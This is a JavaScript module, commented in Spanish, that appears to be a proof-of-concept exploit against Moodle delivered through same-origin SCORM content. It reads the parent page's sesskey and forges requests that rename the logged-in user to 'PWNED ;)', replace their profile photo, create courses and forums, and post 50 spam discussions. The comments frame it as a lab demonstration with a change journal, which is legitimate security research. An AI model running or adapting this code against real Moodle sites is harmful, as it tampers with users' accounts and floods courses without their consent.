/*
 * Acciones de demostración contra Moodle. Portadas de
 * poc/sandbox-video-probe-src/probe.js:267-476 sin cambiar su lógica de red.
 *
 * Solo se ejecutan cuando una persona pulsa el botón, solo funcionan en
 * same-origin (legacy) y solo contra un laboratorio propio y desechable.
 */

import { AVATAR_DATA_URI, avatarPng } from './avatar.js';

// Sustitución visual inmediata: no espera a los formularios ni a la subida
// persistente. Moodle muestra un <img> cuando hay foto, pero usa un
// <span.userinitials role="img"> cuando no la hay; ambos reciben el avatar y
// la misma aureola verde.
export function swapAvatarInDom(w) {
  var selector = [
    '.userbutton .avatars .avatar.current img',
    '.userbutton .avatars .avatar.current .userinitials',
    'img.userpicture',
    '.usermenu img',
    '.usermenu .userinitials',
    'img[src*="/user/icon"]',
    'img[src*="pluginfile.php"][src*="user"]',
    'span.userinitials[role="img"]',
  ].join(',');
  var avs = w.document.querySelectorAll(selector);
  var reduceMotion = false;
  try {
    reduceMotion = Boolean(w.matchMedia && w.matchMedia('(prefers-reduced-motion: reduce)').matches);
  } catch (e) { /* el resaltado estático sigue siendo suficiente */ }
  for (var i = 0; i < avs.length; i++) {
    var avatar = avs[i];
    if (String(avatar.tagName).toLowerCase() === 'img') {
      if (!avatar.hasAttribute('data-exe-orig')) {
        avatar.setAttribute('data-exe-orig', avatar.src);
      }
      avatar.src = AVATAR_DATA_URI;
    } else {
      if (!avatar.hasAttribute('data-exe-orig-style')) {
        avatar.setAttribute('data-exe-orig-style', avatar.getAttribute('style') || '');
        avatar.setAttribute('data-exe-orig-text', avatar.textContent || '');
      }
      var replacement = avatar.querySelector('img[data-exe-live-avatar]');
      if (!replacement) {
        replacement = avatar.ownerDocument.createElement('img');
        replacement.setAttribute('data-exe-live-avatar', 'true');
        replacement.alt = '';
        replacement.style.width = '100%';
        replacement.style.height = '100%';
        replacement.style.display = 'block';
        replacement.style.objectFit = 'cover';
        replacement.style.borderRadius = 'inherit';
        avatar.textContent = '';
        avatar.appendChild(replacement);
      }
      replacement.src = AVATAR_DATA_URI;
    }
    avatar.style.outline = '3px solid #39ff77';
    avatar.style.outlineOffset = '2px';
    avatar.style.borderRadius = '50%';
    avatar.style.boxShadow = '0 0 0 5px rgba(57,255,119,.22)';
    if (!reduceMotion && typeof avatar.animate === 'function') {
      try {
        avatar.animate([
          { transform: 'scale(.65) rotate(-12deg)', opacity: 0.35 },
          { transform: 'scale(1.18) rotate(6deg)', opacity: 1, offset: 0.72 },
          { transform: 'scale(1) rotate(0deg)', opacity: 1 },
        ], { duration: 520, easing: 'cubic-bezier(.2,.8,.2,1)' });
      } catch (e) { /* el cambio de src ya está hecho */ }
    }
  }
  return avs.length;
}

// SCORM suele añadir una ventana intermedia (`player.php`) entre el SCO y la
// cabecera visible de Moodle; en modo emergente, esa cabecera puede estar en
// `window.opener`. Recorre únicamente ventanas alcanzables same-origin y se
// detiene ante cualquier frontera de origen.
export function swapAvatarInReachableHostDoms(firstWindow) {
  var pending = firstWindow ? [firstWindow] : [];
  var seen = [];
  var swapped = 0;
  while (pending.length) {
    var current = pending.shift();
    if (!current || seen.indexOf(current) !== -1) { continue; }
    seen.push(current);
    try {
      void current.location.href;
      swapped += swapAvatarInDom(current);
      var parent = current.parent;
      var opener = current.opener;
      if (parent && parent !== current) { pending.push(parent); }
      if (opener && opener !== current) { pending.push(opener); }
    } catch (e) {
      // No se intenta franquear una ventana cross-origin u opaca.
    }
  }
  return swapped;
}

// Moodle Playground monta Moodle bajo una ruta efímera y no siempre publica
// M.cfg.wwwroot. En ese caso se conserva el prefijo real observado en la URL
// de la página o en un enlace del propio Moodle.
export function resolveMoodleRoot(w, fallbackOrigin) {
  try {
    var configured = w && w.M && w.M.cfg && w.M.cfg.wwwroot;
    if (configured) { return String(configured).replace(/\/$/, ''); }
  } catch (e) { /* seguir con las pistas del documento */ }
  try {
    var courseLink = w.document.querySelector('a[href*="/course/view.php"], a[href*="/course/section.php"]');
    var candidate = courseLink ? courseLink.href : w.location.href;
    var url = new URL(candidate, w.location.href);
    var marker = url.pathname.match(/^(.*?)(?:\/course\/|\/mod\/|\/user\/|\/admin\/|\/my\/|\/login\/|\/lib\/)/);
    if (marker) { return url.origin + marker[1]; }
  } catch (e) { /* usar el origen como último recurso */ }
  return String(fallbackOrigin || '').replace(/\/$/, '');
}

// Moodle publica normalmente el curso actual en M.cfg.courseId. Los fallbacks
// de DOM cubren temas/versiones donde esa propiedad no esté presente.
export function resolveCurrentCourseId(w) {
  try {
    var cfgId = w && w.M && w.M.cfg && w.M.cfg.courseId;
    if (cfgId && Number(cfgId) > 0) { return String(cfgId); }
  } catch (e) { /* seguir con el DOM */ }
  try {
    var bodyClass = (w.document.body && w.document.body.className) || '';
    var classMatch = String(bodyClass).match(/(?:^|\s)course-(\d+)(?:\s|$)/);
    if (classMatch) { return classMatch[1]; }
    var courseLink = w.document.querySelector('a[href*="/course/view.php?id="]');
    var hrefMatch = courseLink && (courseLink.getAttribute('href') || '').match(/[?&]id=(\d+)/);
    return hrefMatch ? hrefMatch[1] : null;
  } catch (e) { return null; }
}

// Cambia el NOMBRE (core_user_update_users) y la FOTO de perfil (sube un PNG del
// avatar al filemanager vía repository_ajax y envía el form de perfil) del usuario
// actual, forjado con el sesskey same-origin. Verificado en Moodle REAL; en el
// Playground PHP-WASM falla (su runtime no sirve /lib/ajax ni /repository).
export function ownUser(ctx, journal, cb) {
  if (ctx.win.origin === 'null' || ctx.win.location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
  var res = {};
  try {
    var w = ctx.parentWin();
    if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
    var root = resolveMoodleRoot(w, ctx.win.location.origin);
    var sk = (w.M && w.M.cfg && w.M.cfg.sesskey) || null;
    var uid = (w.M && w.M.cfg && w.M.cfg.userId) || null;
    if (!uid) { var a = w.document.querySelector('a[href*="/user/profile.php?id="]'); var mm = a && (a.getAttribute('href') || '').match(/id=(\d+)/); uid = mm ? mm[1] : null; }
    res.targetUserId = uid;
    // Nombre actual, leído del DOM del padre ANTES de tocar nada: es lo que el
    // diario necesita como "previous" para poder documentar la reversión.
    var previousFullName = null;
    try {
      var nameEl = w.document.querySelector('.usermenu .usertext');
      previousFullName = nameEl ? nameEl.textContent.trim() : null;
    } catch (e) { previousFullName = null; }
    // (a) swap inmediato del avatar en el DOM — efecto visual al instante
    try {
      res.avatarSwappedInDom = swapAvatarInReachableHostDoms(w);
    } catch (e) { res.avatarSwappedInDom = 'BLOCKED:' + e.name; }
    if (!sk || !uid) { res.renamed = false; res.note = 'sin sesskey o userId (¿logueado? ¿Moodle real?)'; cb(JSON.stringify(res)); return; }
    journal.record({
      host: 'moodle',
      kind: 'user-profile',
      label: 'Nombre del usuario ' + uid,
      id: uid,
      previous: previousFullName, // leído del DOM del padre ANTES de tocar nada
      undo: null,                 // se revierte desde el perfil; queda como no reversible
    });
    // (b) RENOMBRAR (persistente)
    var renameP = w.fetch(root + '/lib/ajax/service.php?sesskey=' + encodeURIComponent(sk) + '&info=core_user_update_users',
      { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify([{ index: 0, methodname: 'core_user_update_users', args: { users: [{ id: Number(uid), firstname: 'PWNED ;)' }] } }]) })
      .then(function (r) { return r.json(); }).then(function (j) { res.renamed = !(j && j[0] && j[0].error); }).catch(function (e) { res.renamed = 'ERR:' + e.name; });
    // (c) NOMBRE + FOTO persistentes via el FORMULARIO de perfil (universal):
    //   user/edit.php?id=<uno-mismo>  -> CUALQUIER usuario cambia su PROPIO nombre+foto
    //   (no requiere capacidades de admin; el core_user_update_users de (b) solo va admin).
    //   user/editadvanced.php?id=<id> -> editar a OTROS (solo admin). Fallback.
    // Rasteriza el avatar propio (embebido, sin red) -> sube al area draft
    // (repository_ajax) -> reenvia el form con firstname='PWNED ;)' + el itemid de la
    // foto. Verificado live en Moodle local y en moodle.example (profesor sobre su
    // PROPIO perfil via edit.php).
    var photoP = new Promise(function (resolve) { avatarPng(ctx.win, 256, function (blob) { resolve(blob); }); })
      .then(function (blob) {
        if (!blob) { res.photoChanged = 'img-render-fail'; return; }
        var editVia = function (url) {
          return w.fetch(url, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (html) {
            var forms = [].slice.call(new DOMParser().parseFromString(html, 'text/html').querySelectorAll('form'));
            var form = forms.filter(function (f) { return f.querySelector('input[name^="_qf__"]'); }).sort(function (a, b) { return b.querySelectorAll('input,select,textarea').length - a.querySelectorAll('input,select,textarea').length; })[0];
            var itemEl = form && form.querySelector('input[name=imagefile]');
            if (!itemEl) { return 'no-form'; }
            var itemid = itemEl.value;
            var repoId = (function () { var k = html.indexOf('"type":"upload"'); if (k < 0) { return '5'; } var bb = html.slice(Math.max(0, k - 300), k); var m = bb.match(/"id":"?(\d+)"?[^{}]*$/); return m ? m[1] : '5'; })();
            var ufd = new FormData(); ufd.append('repo_upload_file', blob, 'pwned-avatar.png'); ufd.append('sesskey', sk); ufd.append('repo_id', repoId); ufd.append('itemid', itemid); ufd.append('savepath', '/'); ufd.append('title', 'pwned-avatar.png'); ufd.append('author', 'PoC'); ufd.append('license', 'unknown');
            return w.fetch(root + '/repository/repository_ajax.php?action=upload', { method: 'POST', credentials: 'same-origin', body: ufd }).then(function (ur) { return ur.json(); }).then(function () {
              var fd = new FormData(form); fd.delete('cancel'); fd.set('submitbutton', '1');
              if (fd.has('firstname')) { fd.set('firstname', 'PWNED ;)'); res.renamedViaForm = true; }
              var act = new URL(form.getAttribute('action') || url, url).href;
              return w.fetch(act, { method: 'POST', credentials: 'same-origin', body: fd }).then(function (sr) { var u = sr.url || ''; return (u.indexOf('/edit.php') === -1 && u.indexOf('editadvanced.php') === -1) ? 'ok' : 'rejected'; });
            });
          });
        };
        // 1) auto-edicion (cualquier usuario sobre si mismo)  2) admin sobre otros
        return editVia(root + '/user/edit.php?id=' + uid).then(function (r1) {
          if (r1 === 'ok') { res.photoChanged = true; res.editPath = 'edit.php (self)'; return; }
          return editVia(root + '/user/editadvanced.php?id=' + uid + '&course=1').then(function (r2) {
            res.photoChanged = (r2 === 'ok'); res.editPath = (r2 === 'ok' ? 'editadvanced.php (admin)' : 'no-form (' + r1 + '/' + r2 + ')');
          });
        });
      }).catch(function (e) { res.photoChanged = 'ERR:' + (e.message || e.name); });
    Promise.all([renameP, photoP]).then(function () { res.note = 'nombre→"PWNED ;)" + foto→avatar PWNED (PERSISTENTES). Reversible desde el perfil del usuario.'; cb(JSON.stringify(res)); });
  } catch (e) { cb('BLOQUEADO: ' + e.name); }
}

// Crea un curso "POC-...", una Etiqueta con texto y 50 avisos lorem ipsum
// en el foro de Avisos, "scrapeando" los formularios de Moodle (que ya traen
// el sesskey) y reenviándolos. Si no tiene moodle/course:create, crea una
// actividad Foro y las 50 discusiones en el curso actual. Requiere Moodle
// REAL; en Playground PHP-WASM falla por límites del runtime, no por seguridad.
export function createCourse(ctx, journal, cb) {
  if (ctx.win.origin === 'null' || ctx.win.location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
  try {
    var w = ctx.parentWin();
    if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
    var root = resolveMoodleRoot(w, ctx.win.location.origin);
    var fallbackCourseId = resolveCurrentCourseId(w);
    var sn = journal.prefix('CREATED');
    var pickForm = function (html) {
      var fs = [].slice.call(new DOMParser().parseFromString(html, 'text/html').querySelectorAll('form'));
      return fs.filter(function (f) { return f.querySelector('input[name^="_qf__"]'); })
               .sort(function (a, b) { return b.querySelectorAll('input,select,textarea').length - a.querySelectorAll('input,select,textarea').length; })[0];
    };
    var submitName = function (form) {
      var b = form.querySelector('[name=submitbutton]') || form.querySelector('[name=saveanddisplay]') ||
              form.querySelector('[name=submitbutton2]') || form.querySelector('[type=submit][name]');
      return b ? b.getAttribute('name') : 'submitbutton';
    };
    var step = function (getUrl, postUrl, overrides) {
      return w.fetch(getUrl, { credentials: 'same-origin' }).then(function (r) {
        if (!r.ok) { throw new Error('HTTP ' + r.status + ' al pedir el formulario'); }
        return r.text();
      }).then(function (html) {
        var form = pickForm(html);
        if (!form) { throw new Error('sin formulario mform (sin permiso?)'); }
        var fd = new FormData(form);
        for (var k in overrides) { fd.set(k, overrides[k]); }
        fd.delete('cancel'); fd.set(submitName(form), '1');
        var act = new URL(form.getAttribute('action') || postUrl, getUrl).href;
        return w.fetch(act, { method: 'POST', credentials: 'same-origin', body: fd }).then(function (rr) { return rr.url || ''; });
      });
    };
    // --- texto aleatorio estilo lorem ipsum (local, sin red) ---
    var LOREM = ('lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor ' +
      'incididunt ut labore et dolore magna aliqua enim ad minim veniam quis nostrud ' +
      'exercitation ullamco laboris nisi aliquip ex ea commodo consequat duis aute irure ' +
      'in reprehenderit voluptate velit esse cillum eu fugiat nulla pariatur excepteur sint ' +
      'occaecat cupidatat non proident sunt culpa qui officia deserunt mollit anim id est laborum').split(' ');
    var rnd = function (n) { return Math.floor(Math.random() * n); };
    var words = function (n) { var a = []; for (var i = 0; i < n; i++) { a.push(LOREM[rnd(LOREM.length)]); } return a.join(' '); };
    var cap = function (str) { return str.charAt(0).toUpperCase() + str.slice(1); };
    var sentence = function () { return cap(words(6 + rnd(8))) + '.'; };
    var subject = function () { return '[PoC] ' + cap(words(3 + rnd(4))); };
    var paragraph = function () { var k = 2 + rnd(2), out = []; for (var i = 0; i < k; i++) { out.push(sentence()); } return out.join(' '); };
    // --- inunda un foro con `count` discusiones lorem ipsum ---
    // Robusto entre versiones de Moodle: desde 4.0 el formulario de "Añadir
    // discusión" es un mform EN LÍNEA en la propia página del foro (action=post.php,
    // con campos forum/subject/message[text]); ya no existe el enlace
    // post.php?forum=N. Además, los enlaces del índice del foro pueden ser
    // RELATIVOS (`view.php?id=N`, 4.5) o ABSOLUTOS (`/mod/forum/view.php?id=N`, 5.2),
    // así que los normalizamos. Probamos los foros del curso y, si no hay ninguno
    // donde publicar, caemos al sitio (curso id=1, que siempre tiene Avisos).
    // Extrae URLs canónicas de vista de foro del índice (relativas o absolutas).
    var forumViewUrls = function (html) {
      var d = new DOMParser().parseFromString(html, 'text/html');
      var urls = [];
      [].slice.call(d.querySelectorAll('a[href]')).forEach(function (a) {
        var h = a.getAttribute('href') || '';
        // Enlace de foro: relativo `view.php?id=N`/`?f=N` o absoluto `/mod/forum/view.php?...`.
        // Excluye `/course/view.php?...` (no empieza por view.php ni lleva /mod/forum/).
        if (/^view\.php\?(?:id|f)=\d+/.test(h) || /\/mod\/forum\/view\.php\?(?:id|f)=\d+/.test(h)) {
          var q = h.match(/view\.php\?((?:id|f)=\d+)/);
          if (q) { var u = '/mod/forum/view.php?' + q[1]; if (urls.indexOf(u) < 0) { urls.push(u); } }
        }
      });
      return urls;
    };
    var formFromForum = function (urls, i) {
      if (i >= urls.length) { return Promise.reject(new Error('no-postable-forum')); }
      var viewUrl = root + urls[i];
      return w.fetch(viewUrl, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (vhtml) {
        var d = new DOMParser().parseFromString(vhtml, 'text/html');
        var forms = [].slice.call(d.querySelectorAll('form'));
        // (a) mform en línea de añadir discusión (Moodle 4.0+).
        var inline = forms.filter(function (f) {
          var a = f.getAttribute('action') || '';
          return /post\.php/.test(a) && f.querySelector('[name="subject"]') && f.querySelector('[name="message[text]"]');
        })[0];
        if (inline) { return { form: inline, act: new URL(inline.getAttribute('action') || 'post.php', viewUrl).href }; }
        // (b) Moodle antiguo: enlace post.php?forum=N -> pedir su formulario.
        var mm = vhtml.match(/post\.php\?forum=(\d+)/);
        if (mm) {
          var pg = root + '/mod/forum/post.php?forum=' + mm[1];
          return w.fetch(pg, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (ph) {
            var f2 = pickForm(ph);
            if (!f2) { return formFromForum(urls, i + 1); }
            return { form: f2, act: new URL(f2.getAttribute('action') || 'post.php', pg).href };
          });
        }
        return formFromForum(urls, i + 1);
      }).catch(function () { return formFromForum(urls, i + 1); });
    };
    var findDiscussionForm = function (cid, allowSiteFallback) {
      // Para un curso recién creado se conserva el respaldo histórico del
      // foro del sitio. En el fallback pedido por el usuario se limita todo
      // al curso actual: primero crea allí una actividad Foro y publica allí.
      var ids = (String(cid) === '1' || !allowSiteFallback) ? [String(cid)] : [String(cid), '1'];
      var tryCourse = function (k) {
        if (k >= ids.length) { return Promise.reject(new Error('ningun foro donde publicar (sin permiso?)')); }
        return w.fetch(root + '/mod/forum/index.php?id=' + ids[k], { credentials: 'same-origin' })
          .then(function (r) { return r.text(); }).then(function (html) {
            return formFromForum(forumViewUrls(html), 0);
          }).catch(function () { return tryCourse(k + 1); });
      };
      return tryCourse(0);
    };
    var spamForum = function (cid, count, allowSiteFallback) {
      return findDiscussionForm(cid, allowSiteFallback).then(function (ctxf) {
        var posted = 0;
        var one = function (i) {
          if (i >= count) { return posted; }
          var fd = new FormData(ctxf.form);
          fd.delete('cancel');
          fd.set('subject', subject());
          fd.set('message[text]', '<p>' + paragraph() + '</p>');
          fd.set('submitbutton', '1');
          return w.fetch(ctxf.act, { method: 'POST', credentials: 'same-origin', body: fd })
            .then(function (rr) { if ((rr.url || '').indexOf('post.php') === -1) { posted++; } return one(i + 1); });
        };
        return one(0);
      });
    };
    var fallbackToCurrentCourse = function (reason) {
      if (!fallbackCourseId) {
        cb(JSON.stringify({
          created: false,
          fallback: false,
          reason: reason,
          note: 'No se pudo crear el curso ni identificar el curso actual.'
        }));
        return;
      }
      var forumName = journal.prefix('FORUM');
      var forumGet = root + '/course/modedit.php?add=forum&type=&course=' +
        encodeURIComponent(fallbackCourseId) + '&section=0&return=0&sr=0';
      var out = {
        created: false,
        fallback: true,
        fallbackReason: reason,
        courseId: fallbackCourseId,
        forumCreated: false,
        forumMessages: 0
      };
      step(forumGet, root + '/course/modedit.php', {
        name: 'POC-SAFE ' + forumName,
        type: 'general',
        'introeditor[text]': '<p>Foro creado por la PoC en el curso actual: ' + paragraph() + '</p>'
      }).then(function (forumUrl) {
        out.forumCreated = Boolean(forumUrl && forumUrl.indexOf('modedit.php') === -1);
        if (!out.forumCreated) { throw new Error('no se pudo crear el foro en el curso actual'); }
        journal.record({
          host: 'moodle',
          kind: 'forum',
          label: 'Foro ' + forumName + ' en curso ' + fallbackCourseId,
          id: forumName,
          previous: null,
          undo: null
        });
        return spamForum(fallbackCourseId, 50, false);
      }).then(function (n) {
        out.forumMessages = n;
        cb(JSON.stringify(out));
      }).catch(function (e) {
        out.forumError = e.message || e.name;
        cb(JSON.stringify(out));
      });
    };
    // 1) crear el curso
    step(root + '/course/edit.php?category=1', root + '/course/edit.php', {
      fullname: 'Curso creado por la PoC', shortname: sn, category: '1',
      'summary_editor[text]': '<p>Resumen creado por la PoC (' + paragraph() + ')</p>'
    }).then(function (url) {
      var created = (url || '').indexOf('course/edit.php') === -1;
      var m = (url || '').match(/[?&](?:id|courseid)=(\d+)/); var cid = m ? m[1] : null;
      if (created && !cid) {
        cb(JSON.stringify({
          created: true,
          courseId: null,
          shortname: sn,
          fallback: false,
          note: 'Curso creado, pero no se pudo detectar su id; no se crea un segundo foro para evitar duplicar cambios.'
        }));
        return;
      }
      if (!created) {
        fallbackToCurrentCourse('sin permiso moodle/course:create o formulario rechazado');
        return;
      }
      journal.record({
        host: 'moodle',
        kind: 'course',
        label: 'Curso ' + sn,
        id: cid,
        previous: null,
        undo: null
      });
      var out = { created: true, courseId: cid, shortname: sn, activityAdded: false, forumMessages: 0 };
      // 2) Etiqueta con texto (FIX: el GET lleva add=label&course=...)
      var labelGet = root + '/course/modedit.php?add=label&type=&course=' + cid + '&section=0&return=0&sr=0';
      step(labelGet, root + '/course/modedit.php', {
        'introeditor[text]': '<p>Actividad (Etiqueta) creada por la PoC: ' + paragraph() + '</p>'
      }).then(function (lurl) { out.activityAdded = !!(lurl && lurl.indexOf('modedit.php') === -1); })
        .catch(function () { out.activityAdded = false; })
        // 3) 50 mensajes lorem ipsum en el foro de Avisos
        .then(function () { return spamForum(cid, 50, true); })
        .then(function (n) { out.forumMessages = n; cb(JSON.stringify(out)); })
        .catch(function (e) { out.forumError = e.message || e.name; cb(JSON.stringify(out)); });
    }).catch(function (e) { fallbackToCurrentCourse(e.message || e.name); });
  } catch (e) { cb('BLOQUEADO: ' + e.name); }
}
